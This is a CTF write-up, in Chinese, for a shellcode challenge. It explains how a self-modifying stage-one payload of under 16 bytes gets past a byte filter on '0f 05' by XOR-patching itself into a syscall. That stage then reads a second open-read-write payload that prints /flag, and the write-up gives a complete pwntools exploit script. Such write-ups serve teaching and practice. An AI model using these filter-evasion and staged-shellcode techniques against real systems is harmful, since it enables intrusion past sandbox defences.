# Shellcode-lv2

## 题目简述

程序在固定地址 `0x20240000` 映射一页 RWX 内存，但第一阶段只读取 `0x10` 字节，并拒绝其中出现连续字节 `0f 05`。随后 seccomp 只允许 `read`、`write` 和 `open`。目标是用不足 16 字节的自修改 Shellcode 现场生成 `syscall`，二次读取完整 ORW 载荷。

## 解题过程

### 1. 利用入口寄存器构造二次读取

主函数最后通过：

```asm
mov rdx, qword ptr [rbp-0x10]
xor eax, eax
call rdx
```

跳入 Shellcode。因此入口时：

- `rdx = 0x20240000`，指向 RWX 缓冲区；
- `rax = 0`，对应 `read` 系统调用号。

只需把 `rdx` 复制到 `rsi`，把 `rdi` 清零，再执行一次系统调用，就能从标准输入把第二阶段重新读入同一页。`rdx` 同时被当作读取长度，虽然数值很大，但实际只发送一小段数据，内核返回的长度不会超过发送量。

### 2. 绕过 `0f 05` 字节过滤

程序在执行前只扫描最初 16 字节是否含有 `0f 05`，但内存仍可写。第一阶段末尾先放置无害的 `0f 95`，再在运行时把第二个字节异或 `0x90`：

$$
0x95\oplus0x90=0x05
$$

于是扫描时不存在 `syscall`，执行到该位置前却会动态变成 `0f 05`：

```asm
push rdx
pop rsi
push 0
pop rdi
xor byte ptr [rip+1], 0x90
; 紧随其后的原始字节为 0f 95，运行时变为 0f 05
```

第二阶段从缓冲区起始位置覆盖第一阶段。系统调用返回后，指令指针仍位于原先 `syscall` 后方，因此第二阶段开头放一段 NOP，保证覆盖过程中仍能平滑落入新代码。

完整利用脚本如下：

```python
from pwn import asm, context, remote, shellcraft

context(os="linux", arch="amd64")

HOST = "TARGET"
PORT = 43010

io = remote(HOST, PORT)

stage1 = asm(
    """
    push rdx
    pop rsi
    push 0
    pop rdi
    xor byte ptr [rip+1], 0x90
    """
) + b"\x0f\x95"

assert len(stage1) <= 0x10
assert b"\x0f\x05" not in stage1

io.sendafter(b"run: ", stage1)
io.recvuntil(b"Good luck!\n")

stage2 = b"\x90" * 0x20
stage2 += asm(
    shellcraft.open("/flag", 0, 0)
    + shellcraft.read(3, "rsp", 0x100)
    + shellcraft.write(1, "rsp", 0x100)
)

io.send(stage2)
io.interactive()
```

seccomp 允许的系统调用号恰好是 `read(0)`、`write(1)` 和 `open(2)`，因此第二阶段使用 ORW，而不能执行 `execve`。题目仓库未保留实例中的实际 flag 字符串，故这里只记录可复现利用链。

## 方法总结

字节黑名单只检查代码的初始形态，无法阻止可写代码页上的自修改行为。短 Shellcode 题应同时检查入口寄存器、映射权限和可用系统调用；本题用现成的 `rax=0` 与 `rdx=buffer` 压缩第一阶段，再通过二次读取解除长度限制。
